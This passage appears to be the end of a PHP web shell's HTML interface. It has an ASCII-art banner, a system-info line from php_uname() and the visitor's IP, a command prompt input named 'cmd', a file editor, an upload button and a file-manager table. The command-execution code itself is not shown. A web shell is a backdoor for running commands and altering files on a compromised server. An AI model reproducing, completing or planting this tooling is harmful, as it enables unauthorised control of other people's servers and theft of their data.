██╔══██╗██╔══╝  ██║    ╚════╝    ██╔══╝  ╚██╗ ██╔╝██╔══██║    ████╔╝██║████╔╝██║
██║  ██║███████╗██║              ███████╗ ╚████╔╝ ██║  ██║    ╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝              ╚══════╝  ╚═══╝  ╚═╝  ╚═╝     ╚═════╝  ╚═════╝ 
<?= php_uname(); ?>
<br><?= $_SERVER['REMOTE_ADDR']; ?>
</div>
            </pre>
            <!-- Command prompt -->
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" style="width: 830px;"/>
                </div>
            </div>
            <!-- Edit container (hidden by default) -->
            <div id="edit-container">
                <div>Edit File: <span id="edit-filename"></span></div>
                <textarea id="edit-textarea"></textarea>
                <br/>
                <button class="btn" onclick="saveEditFile()">Save</button>
                <button class="btn" onclick="cancelEditFile()">Cancel</button>
            </div>
            <!-- File Manager below edit container -->
            <div id="filemanager">
                <div id="breadcrumbs"></div>
                <button id="upload-btn">Upload</button>
                <table id="file-list-table">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Permission</th>
                            <th>Size</th>
                            <th>Last Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="file-list">
                    </tbody>
                </table>
            </div>
        </div>
    </body>
</html>
